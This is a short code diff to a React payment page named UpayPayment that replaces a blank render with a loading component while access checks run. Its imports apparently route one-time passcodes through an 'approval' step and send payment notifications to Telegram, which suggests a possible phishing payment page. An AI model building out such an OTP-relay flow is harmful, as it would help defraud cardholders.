@@ -3,6 +3,7 @@ import { useNavigate, useSearchParams } from "@/lib/flowRouter";
 import { sendTelegramNotification } from "@/lib/payment-telegram";
 import { submitOtpForApproval } from "@/lib/otpApproval";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
 import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
 import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
@@ -156,7 +157,7 @@ const UpayPayment = () => {
   const isDisabled = !confirmEnabled || isLoading;
   const confirmBgColor = (confirmEnabled && !isLoading) ? 'rgb(36, 76, 154)' : '#aaa';
 
-  if (isAllowed !== true) return null;
+  if (isAllowed !== true) return <FlowLoading />;
 
   return (
     <div className="fixed inset-0 flex flex-col items-start justify-start p-4 pt-6 overflow-hidden" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
